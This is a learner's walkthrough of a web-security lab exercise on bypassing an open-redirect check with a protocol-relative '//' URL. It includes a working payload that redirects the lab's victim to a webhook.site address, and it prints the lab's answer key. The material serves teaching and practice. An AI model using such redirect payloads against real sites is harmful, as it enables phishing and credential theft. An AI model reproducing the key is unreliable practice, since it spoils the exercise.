Open Redirect 02

This challenge

In this challenge, the redirect URL needs to start with /. The developer made the assumption that only a path/URI can start with /. 
However, it's possible to bypass this mechanism by using //. 
For this challenge, you may want to use another site than webhook.site as they don't automatically redirect http:// to https://. 
Otherwise, you can use the https:// URL for this exercise.

 This exercise gets scored in 2 steps. First, you need to get the victim to visit your page to get the key. Once you put the URL below and click submit, the victim will visit your link:

 Note: The URL needs to start with the challenge's URL (for example: http://ptl-bb9a9160-aabcf998.libcurl.so/redirect.php?...) 

 Then you can use the form below to submit the key you retrieved from step 1:
To mark this exercise as completed, you need to submit the key that you will get by finishing this exercise:

 You can access this exercise using the following URL: http://ptl-bb9a9160-aabcf998.libcurl.st/. 

Steps: 
    1) Visit the given URL: http://ptl-bb9a9160-aabcf998.libcurl.st/.
    2) We can see 'click here' in that page. Copy the link address. 
        We might have notice about this lab that you should be able to redirect the victim to webhook.site
        Open the site and we can get url that have to be redirected.
    3)   But this time https won't work in redirect url. I mean we have to use only // instead of https://. 
        Look how it make formats:
                    http://ptl-bb9a9160-aabcf998.libcurl.st/redirect.php?uri=//webhook.site/7302b786-e834-4dc4-b64a-e00d1c9d6ea2
    4)  And back to the lab into and submit the url. Again visit previous site of webhook.site. 
    5)  After some time we'll get our key in user-agent  PTLAB_KEY: abca1bba-675f-490d-abd8-a48ac47d6dbe.
    6)  Bravo!!  Congrats you have finished this exercise! 

            Happy Hacking!! :)
